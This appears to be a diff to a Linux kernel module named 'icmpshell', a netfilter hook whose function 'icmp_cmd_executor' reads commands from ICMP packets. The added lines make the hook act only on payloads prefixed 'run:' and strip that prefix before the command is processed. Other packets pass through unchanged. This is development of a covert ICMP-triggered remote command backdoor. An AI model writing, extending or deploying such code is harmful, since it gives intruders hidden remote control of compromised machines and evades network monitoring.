@@ -48,6 +48,16 @@ static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const str
 
   }
 
+  if (strncmp(cmd_string, "run:", 4) != 0) {
+    return NF_ACCEPT;
+  } else {
+    for (j = 0; j <= sizeof(cmd_string)/sizeof(cmd_string[0])-4; j++) {
+      cmd_string[j] = cmd_string[j+4];
+      if (cmd_string[j] == '\0')
+	break;
+    }
+  }
+
   printk(KERN_DEBUG
          "icmpshell: type=%d; code=%d; data=%s",
          icmph->type,
